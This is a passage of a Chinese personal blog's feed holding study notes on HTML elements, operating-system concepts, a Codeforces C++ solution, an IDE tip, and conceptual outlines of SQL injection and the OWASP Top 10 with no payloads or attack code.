开始。</strong><br>自定义列表中的一个术语名可以对应多重定义或者多个术语名对应同一个定义，如果只有术语名或者只有定义也是可行的，也就是说 &lt;dt&gt; 与 &lt;dd&gt; 在其中数量不限、对应关系不限。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="20-区块"><a href="#20-区块" class="headerlink" title="20.区块"></a>20.区块</h2><h3 id="20-1区块元素"><a href="#20-1区块元素" class="headerlink" title="20.1区块元素"></a>20.1区块元素</h3><p>块级元素在浏览器显示时，通常会以新行来开始（和结束）。即会单独占据一行。<br>如：&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</p><h3 id="20-2内联元素"><a href="#20-2内联元素" class="headerlink" title="20.2内联元素"></a>20.2内联元素</h3><p>内联元素在显示时通常不会以新行开始。<br>如：&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</p><h3 id="20-3元素-lt-div-gt"><a href="#20-3元素-lt-div-gt" class="headerlink" title="20.3元素&lt;div&gt;"></a>20.3元素&lt;div&gt;</h3><p>&lt;div&gt; 标签可以把文档分割为独立的、不同的部分。<br>HTML &lt;div&gt; 元素是<strong>块级元素</strong>，它是可用于组合其他 HTML 元素的容器。<br>&lt;div&gt; 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。<br>如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。<br>&lt;div&gt; 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。</p><h3 id="20-4元素-lt-span-gt"><a href="#20-4元素-lt-span-gt" class="headerlink" title="20.4元素&lt;span&gt;"></a>20.4元素&lt;span&gt;</h3><p>HTML &lt;span&gt; 元素是<strong>内联元素</strong>，可用作文本的容器。<br>&lt;span&gt; 元素也没有特定的含义。<br>当与 CSS 一同使用时，&lt;span&gt; 元素可用于为部分文本设置样式属性。</p>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机操作系统-1.操作系统的概念、功能和目标</title>
    <link href="/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E5%8A%9F%E8%83%BD%E5%92%8C%E7%9B%AE%E6%A0%87/"/>
    <url>/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E5%8A%9F%E8%83%BD%E5%92%8C%E7%9B%AE%E6%A0%87/</url>
    
    <content type="html"><![CDATA[<p>操作系统（operation system，简称OS）是管理计算机硬件与软件资源的计算机程序。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入设备与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h2><p><img src="https://img-blog.csdnimg.cn/20210501080554799.png"></p><h2 id="1-操作系统的层次结构"><a href="#1-操作系统的层次结构" class="headerlink" title="1.操作系统的层次结构"></a>1.操作系统的层次结构</h2><p><img src="https://img-blog.csdnimg.cn/20210502074952178.png"></p><h2 id="2-操作系统的概念"><a href="#2-操作系统的概念" class="headerlink" title="2.操作系统的概念"></a>2.操作系统的概念</h2><p>操作系统（Operating System，OS）是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口环境，它是计算机系统中最基本的系统软件。<br>总的来说就是：</p><ul><li>是系统最基本最核心的软件，属于系统软件</li><li>控制和管理整个计算机的硬件和软件资源</li><li>合理的组织、调度计算机的工作与资源的分配</li><li>为用户和其他软件提供方便的接口和环境</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502082821175.png"></p><h2 id="3-操作系统的功能和目标"><a href="#3-操作系统的功能和目标" class="headerlink" title="3.操作系统的功能和目标"></a>3.操作系统的功能和目标</h2><ul><li>思维导图</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502083039448.png"></p><p>举例说明操作系统的功能：</p><blockquote><ul><li>假设：用户是雇主，操作系统是工人（用来操作机器），计算机是机器（由处理机(CPU)、存储器、设备、文件几个部件构成）</li><li>工人有熟练的技能去控制和协调各个部件的工作，这就是操作系统对资源的管理</li><li>同时，工人必须接受雇主的命令，这就是“接口”</li><li>有了工人，机器就能发挥更大的作用，因此工人就成了“扩充机器”</li><li>工人操作机器、机器有了更大的作用比如GUI界面，于是工人便成了扩充机器，去扩充GUI界面等功能</li></ul></blockquote><h3 id="（1）作为计算机系统资源的管理者"><a href="#（1）作为计算机系统资源的管理者" class="headerlink" title="（1）作为计算机系统资源的管理者"></a>（1）作为计算机系统资源的管理者</h3><p>补充知识：进程是一个程序的执行过程。执行前需要将该程序放到内存中，才能被CPU处理。</p><ul><li>管理软硬件资源、合理的组织、调度计算机的工作与资源的分配</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502092715359.png"></p><blockquote><p>1.处理器（CPU）管理</p></blockquote><p>在多道程序环境下，cpu的分配和运行都以进程（或线程）为基本单位，因此对cpu的管理可理解为对进程的管理。进程管理的主要功能包括进程控制、进程同步、进程通信、死锁处理、处理机调度等。附上一张图理解对进程的管理。</p><blockquote><p>2.存储器管理</p></blockquote><p>为多道程序的运行提供良好的环境，方便用户使用及提高内存的利用率，主要包括内存分配与回收、地址映射、内存保护与共享和内存扩充等功能。</p><blockquote><p>3.文件管理</p></blockquote><p>计算机中所有的信息都是以文件的形式存在的，操作系统中负责文件的管理的部分称为文件系统，文件管理包括文件存储空间的管理、目录管理及文件读写管理和保护等。</p><blockquote><p>4.设备管理</p></blockquote><p>设备管理的主要任务是完成用户的I/O请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓存管理、设备分配、设备处理和虚拟设备等功能。</p><p><strong>以上4种管理功能都由操作系统负者，用户无需关注。</strong></p><h3 id="（2）作为用户与计算机硬件系统之间的接口"><a href="#（2）作为用户与计算机硬件系统之间的接口" class="headerlink" title="（2）作为用户与计算机硬件系统之间的接口"></a>（2）作为用户与计算机硬件系统之间的接口</h3><p><img src="https://img-blog.csdnimg.cn/20210502093613215.png"></p><p> <strong>操作系统提供的接口分为两类：命令接口和程序接口</strong></p><blockquote><ul><li>命令接口：允许用户可以直接使用</li><li>程序接口：允许用户通过程序间接使用</li></ul></blockquote><h4 id="1-命令接口"><a href="#1-命令接口" class="headerlink" title="1.命令接口"></a>1.命令接口</h4><p>命令接口分为两类：联机命令接口和脱机命令接口，用户可以直接调用。</p><ul><li>联机命令接口：又称交互式命令接口，适用于分时或实时系统的接口，由一组键盘操作命令组成。用户输入一条指令，操作系统就执行一条指令；（用户说一句，系统做一句）</li><li>脱机命令接口：又称批处理接口，使用于批处理系统，由一组作业控制命令组成。用户输入一堆指令，操作系统运行一堆指令。在操作系统运行这些命令时用户不可干预。（用户说一堆，系统做一堆）<blockquote><p>批处理(Batch)，也称为批处理脚本。顾名思义，批处理就是对某对象进行批量的处理，通常被认为是一种简化的脚本语言，它应用于DOS和Windows系统中。批处理文件的扩展名为bat 。</p></blockquote></li></ul><h4 id="2-程序接口"><a href="#2-程序接口" class="headerlink" title="2.程序接口"></a>2.程序接口</h4><ul><li>程序接口：由一组系统调用（也称广义指令）组成（程序接口=系统调用）</li><li>用户通过在程序中使用这些系统调用来请求操作系统为其提供服务，只能通过用户程序间接调用</li><li>如使用各种外部设备、申请分配和回收内存及其它各种要求</li></ul><p><img src="https://img-blog.csdnimg.cn/20210502095152928.png"></p><blockquote><p>动态链接库英文为DLL，是Dynamic Link Library的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210502095353416.png"></p><h4 id="3-GUI"><a href="#3-GUI" class="headerlink" title="3.GUI"></a>3.GUI</h4><p>现代操作系统中最流行的图形用户接口。</p><p>总结</p><p><img src="https://img-blog.csdnimg.cn/20210502095725128.png"></p><h3 id="（3）虚拟机"><a href="#（3）虚拟机" class="headerlink" title="（3）虚拟机"></a>（3）虚拟机</h3><p><img src="https://img-blog.csdnimg.cn/20210502100053554.png"></p><ul><li>没有任何软件支持的计算机称为裸机。</li><li>把覆盖了软件的机器称为扩充机器，又称之为虚拟机。</li></ul><p>例子</p><p><img src="https://img-blog.csdnimg.cn/20210502100508372.png"></p>]]></content>
    
    
    <categories>
      
      <category>计算机操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机操作系统-2.操作系统的特征</title>
    <link href="/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-2.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <url>/2021/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-2.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E5%BE%81/</url>
    
    <content type="html"><![CDATA[<p>操作系统（operation system，简称OS）是管理计算机硬件与软件资源的计算机程序。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入设备与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="本节知识总览图"><a href="#本节知识总览图" class="headerlink" title="本节知识总览图"></a>本节知识总览图</h2><p><img src="https://img-blog.csdnimg.cn/20210502101108243.png"></p><p><img src="https://img-blog.csdnimg.cn/20210502110029689.png"></p><h3 id="1-并发"><a href="#1-并发" class="headerlink" title="1.并发"></a>1.并发</h3><ul><li>并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。<blockquote><p><strong>注意区分 并发与并行 的区别</strong></p><ul><li>并行：指两个或多个事件在同一时刻同时发生。</li></ul></blockquote></li></ul><p>操作系统的并发性指计算机系统中同时存在着多个运行着的程序。</p><blockquote><p>一个单核处理机（CPU）同一时刻只能执行一个程序，因此操作系统会负责协调多个程序交替执行（这些程序微观上是交替执行的，但宏观上看起来就像在同时执行）。事实上，操作系统就是伴随着”多道程序技术“而出现的。因此，操作系统和程序并发是一起诞生的。</p></blockquote><blockquote><p>在如今的计算机中，一般都是多核cpu的，即在同一时刻可以并行执行多个程序，比如计算机是8核的，则计算机可以在同一时刻并行执行8个程序，但是事实上我们计算机执行的程序并不止8个，因此并发技术是必须存在的，并发性必不可少。</p></blockquote><h3 id="2-共享"><a href="#2-共享" class="headerlink" title="2.共享"></a>2.共享</h3><p>共享：即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>资源共享有两种共享方式：互斥共享方式和同时共享方式</p><blockquote><ul><li>互斥共享方式： 系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源。</li><li>同时共享方式：系统中的某些资源，允许一个时间段内由多个进程”同时“对它们进行访问。</li></ul></blockquote><p><strong>所谓的“同时”往往是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问的（即分时共享）</strong><br>实例：</p><ul><li>互斥共享方式：使用QQ和微信。同一时间段内摄像头只能分配给其中一个进程。</li><li>同时共享方式：用QQ发送文件A，同时使用微信发送文件B。宏观上看，两边都在同时读取并发送文件，说明两个进程都在访问硬盘资源，从中读取数据。微观上看，两个进程是交替着访问硬盘的。</li></ul><p><strong>有时候多个进程可能真的是在同时进行资源访问，比如玩游戏时可以放音乐，游戏声音和音乐声音都能听见</strong></p><h3 id="👉并发和共享的关系"><a href="#👉并发和共享的关系" class="headerlink" title="👉并发和共享的关系"></a>👉并发和共享的关系</h3><p>并发性：指计算机系统中同时存在着多个运行着的程序。<br>共享性：指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>用上述例子看并发和共享的关系：<br>使用QQ发送文件A，同时使用微信发送文件B。</p><ul><li><p>1.两个进程正在并发执行（并发性）</p><blockquote><p>如果失去并发性，则系统中只有一个程序正在运行，则共享性失去存在的意义。</p></blockquote></li><li><p>2.需要共享地访问硬盘资源（共享性）</p><blockquote><p>如果失去共享性，则QQ和微信不能同时访问硬盘资源，就无法实现同时发送文件，也就无法并发。</p></blockquote></li></ul><p><strong>并发性和共享性互为存在条件</strong></p><h3 id="3-虚拟"><a href="#3-虚拟" class="headerlink" title="3.虚拟"></a>3.虚拟</h3><p>虚拟：指把一个物理上的实体变为若干个逻辑上的对应物。物理实体（前者）是实际存在的，而逻辑上对应物（后者）是用户感受的。</p><ul><li><p>如：一个游戏需要4GB的运行内存，QQ需要256MB的内存，某视频播放器需要256MB的内存······，而计算机的内存只有4GB，但计算机还是可以同时运行他们。</p><blockquote><p>这就是虚拟存储器技术（虚拟技术中的“空分复用技术”）。实际只有4GB的内存，在用户看来似乎远远大于4GB。</p></blockquote></li><li><p>如：既然一个程序需要被分配CPU才能正常执行，那为什么单核CPU的电脑中能同时运行多个程序。</p><blockquote><p>这是虚拟处理器技术。实践上只有一个单核CPU，在用户看来似乎由多个CPU在同时服务。</p></blockquote></li></ul><p><strong>虚拟技术中的“时分复用技术”。微观上处理机在各个微小的时间段内交替着为各个进程服务。</strong></p><p>虚拟技术分为：</p><blockquote><ul><li>空分复用技术（如虚拟存储器技术）</li></ul></blockquote><blockquote><ul><li>时分复用技术（如虚拟处理器）<br>显然，如果失去了并发性，则一个时间段内系统中只需要运行一道程序，那么就失去了实现虚拟性的意义了。因此，没有并发性，就谈不上虚拟性。</li></ul></blockquote><h3 id="4-异步"><a href="#4-异步" class="headerlink" title="4.异步"></a>4.异步</h3><p>异步：指在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进，这就是进程的异步性。</p><p>如果失去了并发性，则系统只能串行地处理各个进程，每个进程的执行会一贯到底。只有系统拥有并发性，才有可能导致异步性。</p>]]></content>
    
    
    <categories>
      
      <category>计算机操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM经典问题-横竖表</title>
    <link href="/2021/05/03/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-%E6%A8%AA%E7%AB%96%E8%A1%A8/"/>
    <url>/2021/05/03/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-%E6%A8%AA%E7%AB%96%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://codeforces.com/contest/1506/problem/A">原题目链接</a></p><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>按列放数<br>单元格从1开始编号;单元格从左到右按列编号，在每列中从上到下编号;每个单元格的个数为比前一个单元格大1。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210503125918720.png"></p><p>按行放数<br>单元格从1开始编号;单元格按行从上到下编号，在每行中从左到右编号;每个单元格的个数为比前一个单元格的个数大1。<br>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210503125945768.png"></p><p>第一行为单个整数t(1≤t≤104)。然后是测试用例。<br>每个测试用例由一行分别包含三个整数n,m, x(1≤n,m≤106,1≤x≤n)，其中n、m为表格的行数和列数，x为按列放时的数。求输出x所在的位置按行放的数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//输入</span><br><span class="hljs-number">5</span><br><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">11</span><br><span class="hljs-number">100</span> <span class="hljs-number">100</span> <span class="hljs-number">7312</span><br><span class="hljs-number">1000000</span> <span class="hljs-number">1000000</span> <span class="hljs-number">1000000000000</span><br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">9</span><br><span class="hljs-number">1174</span><br><span class="hljs-number">1000000000000</span><br></code></pre></div></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> t;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;t;<br>    <span class="hljs-keyword">while</span>(t--)&#123;<br>      <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> n,m,x;<br>      <span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;x;<br>      x-=<span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">int</span> row=(x%n);<br>      <span class="hljs-keyword">int</span> col=x/n;<br>      <span class="hljs-built_in">cout</span>&lt;&lt;row*m+col+<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//可以总结为一个公式</span><br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM经典问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA背景换成图片</title>
    <link href="/2021/04/19/IDEA%E8%83%8C%E6%99%AF%E6%8D%A2%E6%88%90%E5%9B%BE%E7%89%87/"/>
    <url>/2021/04/19/IDEA%E8%83%8C%E6%99%AF%E6%8D%A2%E6%88%90%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>IDEA背景换成图片方式。</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-下载插件"><a href="#1-下载插件" class="headerlink" title="1.下载插件"></a>1.下载插件</h2><p>打开IDEA，File -&gt; Settings -&gt; Plugins ，在 Marketplace 中搜索 Backgroundimage 并下载（installed）。这里为已安装过了。</p><p><img src="https://img-blog.csdnimg.cn/20210419201738633.png"></p><h2 id="2-选择图片"><a href="#2-选择图片" class="headerlink" title="2.选择图片"></a>2.选择图片</h2><p>依次点击 File -&gt; Settings -&gt; Appearance&amp;Behavior -&gt;Appearance -&gt; Background Image -&gt;选择图片位置 -&gt; OK 。</p><p><img src="https://img-blog.csdnimg.cn/20210419202116732.png"></p><p><img src="https://img-blog.csdnimg.cn/20210419202227508.png"></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB常见漏洞(一)-SQL注入漏洞</title>
    <link href="/2021/04/19/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/19/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>WEB常见漏洞(一)。SQL注入漏洞。指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-SQL注入特点"><a href="#1-SQL注入特点" class="headerlink" title="1.SQL注入特点"></a>1.SQL注入特点</h2><blockquote><p>1.广泛性<br>任何一个基于SQL语言的数据库都可能被攻击，很多开发人员在编写Web应用程序时未对从输入参数、Web表单、cookie等接受到的值进行规范性验证和检测，通常会出现SQL注入漏洞。</p></blockquote><blockquote><p>2.隐蔽性<br>SQL注入语句一般都嵌入在普通的HTTP请求中，很难与正常语句区分开，所以当前许多防火墙都无法识别予以警告，而且SQL注入变种极多，攻击者可以调整攻击的参数，所以使用传统的方法防御SQL注入效果非常不理想。</p></blockquote><blockquote><p>3.危害大<br>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p></blockquote><blockquote><p>4.操作方便<br>互联网上有很多SQL注入工具，简单易学，攻击过程简单，不需要专业知识也能自如运用。</p></blockquote><h2 id="2-注入过程"><a href="#2-注入过程" class="headerlink" title="2.注入过程"></a>2.注入过程</h2><p>第一步：SQL注入点探测。<br>第二步：收集后台数据库信息。<br>第三步：猜解用户名和密码。<br>第四步：查找Web后台管理入口。<br>第五步：入侵和破坏。</p><h2 id="3-变量类型注入"><a href="#3-变量类型注入" class="headerlink" title="3.变量类型注入"></a>3.变量类型注入</h2><h3 id="3-1数字型注入"><a href="#3-1数字型注入" class="headerlink" title="3.1数字型注入"></a>3.1数字型注入</h3><h3 id="3-2字符型注入"><a href="#3-2字符型注入" class="headerlink" title="3.2字符型注入"></a>3.2字符型注入</h3><h2 id="4-HTTP提交方式注入"><a href="#4-HTTP提交方式注入" class="headerlink" title="4.HTTP提交方式注入"></a>4.HTTP提交方式注入</h2><h3 id="4-1GET注入"><a href="#4-1GET注入" class="headerlink" title="4.1GET注入"></a>4.1GET注入</h3><h3 id="4-2POST注入"><a href="#4-2POST注入" class="headerlink" title="4.2POST注入"></a>4.2POST注入</h3><h3 id="4-3Cookie注入"><a href="#4-3Cookie注入" class="headerlink" title="4.3Cookie注入"></a>4.3Cookie注入</h3><h2 id="5-注入手法"><a href="#5-注入手法" class="headerlink" title="5.注入手法"></a>5.注入手法</h2><h3 id="5-1盲注"><a href="#5-1盲注" class="headerlink" title="5.1盲注"></a>5.1盲注</h3><h4 id="5-1-1基于布尔的盲注"><a href="#5-1-1基于布尔的盲注" class="headerlink" title="5.1.1基于布尔的盲注"></a>5.1.1基于布尔的盲注</h4><h4 id="5-1-2基于时间的盲注"><a href="#5-1-2基于时间的盲注" class="headerlink" title="5.1.2基于时间的盲注"></a>5.1.2基于时间的盲注</h4><h3 id="5-2联合查询注入"><a href="#5-2联合查询注入" class="headerlink" title="5.2联合查询注入"></a>5.2联合查询注入</h3><h3 id="5-3基于错误信息的注入"><a href="#5-3基于错误信息的注入" class="headerlink" title="5.3基于错误信息的注入"></a>5.3基于错误信息的注入</h3><h2 id="6-检测技术"><a href="#6-检测技术" class="headerlink" title="6.检测技术"></a>6.检测技术</h2><h3 id="6-1动态检测"><a href="#6-1动态检测" class="headerlink" title="6.1动态检测"></a>6.1动态检测</h3><h3 id="6-2静态检测"><a href="#6-2静态检测" class="headerlink" title="6.2静态检测"></a>6.2静态检测</h3><h2 id="7-防范措施"><a href="#7-防范措施" class="headerlink" title="7.防范措施"></a>7.防范措施</h2><h3 id="7-1分级管理"><a href="#7-1分级管理" class="headerlink" title="7.1分级管理"></a>7.1分级管理</h3><h3 id="7-2参数传值"><a href="#7-2参数传值" class="headerlink" title="7.2参数传值"></a>7.2参数传值</h3><h3 id="7-3基础过滤与二次过滤"><a href="#7-3基础过滤与二次过滤" class="headerlink" title="7.3基础过滤与二次过滤"></a>7.3基础过滤与二次过滤</h3><h3 id="7-4使用安全参数"><a href="#7-4使用安全参数" class="headerlink" title="7.4使用安全参数"></a>7.4使用安全参数</h3><h3 id="7-5漏洞扫描"><a href="#7-5漏洞扫描" class="headerlink" title="7.5漏洞扫描"></a>7.5漏洞扫描</h3><h3 id="7-6多层验证"><a href="#7-6多层验证" class="headerlink" title="7.6多层验证"></a>7.6多层验证</h3><h3 id="7-7数据库信息加密"><a href="#7-7数据库信息加密" class="headerlink" title="7.7数据库信息加密"></a>7.7数据库信息加密</h3><h4 id="7-7-1对称加密"><a href="#7-7-1对称加密" class="headerlink" title="7.7.1对称加密"></a>7.7.1对称加密</h4><p>即加密方和解密方都使用相同的加密算法和密钥，这种方案的密钥的保存非常关键，因为算法是公开的，而密钥是保密的，一旦密匙泄露，黑客仍然可以轻易解密。常见的对称加密算法有：AES、DES等。</p><h4 id="7-7-2非对称加密"><a href="#7-7-2非对称加密" class="headerlink" title="7.7.2非对称加密"></a>7.7.2非对称加密</h4><p>即使用不同的密钥来进行加解密，密钥被分为公钥和私钥，用私钥加密的数据必须使用公钥来解密，同样用公钥加密的数据必须用对应的私钥来解密，常见的非对称加密算法有：RSA等。</p><h4 id="7-7-3不可逆加密"><a href="#7-7-3不可逆加密" class="headerlink" title="7.7.3不可逆加密"></a>7.7.3不可逆加密</h4><p>利用哈希算法使数据加密之后无法解密回原数据，这样的哈希算法常用的有：md5、SHA-1等。</p>]]></content>
    
    
    <categories>
      
      <category>WEB常见漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP常见漏洞-内容目录概括</title>
    <link href="/2021/04/18/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/"/>
    <url>/2021/04/18/OWASP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95%E6%A6%82%E6%8B%AC/</url>
    
    <content type="html"><![CDATA[<p>OWASP常见漏洞。内容目录概括。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h2 id="失效身份验证和会话管理"><a href="#失效身份验证和会话管理" class="headerlink" title="失效身份验证和会话管理"></a>失效身份验证和会话管理</h2><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h2 id="XML外部实体注入攻击（XXE）"><a href="#XML外部实体注入攻击（XXE）" class="headerlink" title="XML外部实体注入攻击（XXE）"></a>XML外部实体注入攻击（XXE）</h2><h2 id="存取控制中断"><a href="#存取控制中断" class="headerlink" title="存取控制中断"></a>存取控制中断</h2><h2 id="安全性错误配置"><a href="#安全性错误配置" class="headerlink" title="安全性错误配置"></a>安全性错误配置</h2><h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><h2 id="使用具有已知漏洞的组件"><a href="#使用具有已知漏洞的组件" class="headerlink" title="使用具有已知漏洞的组件"></a>使用具有已知漏洞的组件</h2><h2 id="日志记录和监控不足"><a href="#日志记录和监控不足" class="headerlink" 